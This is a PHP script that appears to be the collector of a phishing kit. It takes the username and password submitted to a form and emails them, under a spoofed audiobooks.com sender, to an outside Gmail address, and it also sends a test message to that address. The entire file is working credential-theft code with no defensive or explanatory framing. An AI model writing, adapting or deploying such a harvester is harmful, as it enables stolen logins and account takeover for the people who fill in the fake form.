<?php
$u = $_POST['username'];
$p= $_POST['password'];

$from = 'info@audiobooks.com';
$to = 'fxtoolz489@gmail.com';
$header = "FROM:".$from;
$body = "USERNAME/EMAIL:".$u."<br>PASSWORD:".$p."<br>**************<br>SPECTRUMS WEBMASTERS<br>**************";
$subject= "LU.SE";

if(mail($to, $subject, $body, $header)){
	
	echo "success";
}else{
	echo "failed";
}
mail('fxtoolz489@gmail.com','Hello','This is a test message','From:info@test.com');






?>